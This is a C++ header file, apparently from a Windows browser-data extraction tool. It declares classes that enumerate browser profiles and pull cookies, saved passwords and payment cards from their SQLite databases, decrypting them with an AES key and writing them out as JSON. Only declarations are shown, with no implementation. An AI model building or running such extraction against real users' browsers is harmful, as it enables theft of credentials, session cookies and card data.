// DataExtraction.h - Database extraction and profile enumeration
#ifndef DATA_EXTRACTION_H
#define DATA_EXTRACTION_H

#include <Windows.h>
#include <vector>
#include <string>
#include <string_view>
#include "winsqlite3.h"

namespace SecurityComponents
{
    class PipeLogger;

    // Data extraction configuration and operations
    namespace Data
    {
        constexpr size_t COOKIE_PLAINTEXT_HEADER_SIZE = 32;

        struct PaymentCard
        {
            std::string guid;
            std::vector<uint8_t> value;
        };

        using PaymentCardTable = std::vector<PaymentCard>;
        using PreQuerySetupFunc = bool (*)(sqlite3*, PaymentCardTable*);
        using JsonFormatterFunc = bool (*)(sqlite3_stmt*, const std::vector<uint8_t>&,
                                           void*, std::string&);
        
        struct ExtractionConfig
        {
            const wchar_t* const* databasePaths;
            std::size_t databaseCount;
            const char* outputFileName;
            const char* sqlQuery;
            PreQuerySetupFunc preQuerySetup;
            JsonFormatterFunc jsonFormatter;
        };

        // Pre-query setup function for payment cards
        bool SetupPaymentCards(sqlite3* db, PaymentCardTable* cards);

        // JSON formatters for different data types
        bool FormatCookie(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                          void* state, std::string& entry);
        bool FormatPassword(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                            void* state, std::string& entry);
        bool FormatPayment(sqlite3_stmt* stmt, const std::vector<uint8_t>& key,
                           void* state, std::string& entry);

        // Returns all extraction configurations
        const ExtractionConfig* GetExtractionConfigs(std::size_t& count);
    }

    // Discovers all available browser profiles
    class ProfileEnumerator
    {
    public:
        ProfileEnumerator(std::wstring userDataRoot, PipeLogger& logger);
        
        // Returns paths to all valid profile directories
        std::vector<std::wstring> FindProfiles();

    private:
        std::wstring m_userDataRoot;
        PipeLogger& m_logger;
    };

    // Extracts data from a specific database within a profile
    class DataExtractor
    {
    public:
        DataExtractor(std::wstring profilePath, const Data::ExtractionConfig& config,
                      const std::vector<uint8_t>& aesKey, PipeLogger& logger,
                      std::wstring baseOutputPath, std::string browserName);

        // Performs extraction for configured data type
        void Extract();

    private:
        std::wstring m_profilePath;
        const Data::ExtractionConfig& m_config;
        const std::vector<uint8_t>& m_aesKey;
        PipeLogger& m_logger;
        std::wstring m_baseOutputPath;
        std::string m_browserName;
    };
}

#endif // DATA_EXTRACTION_H
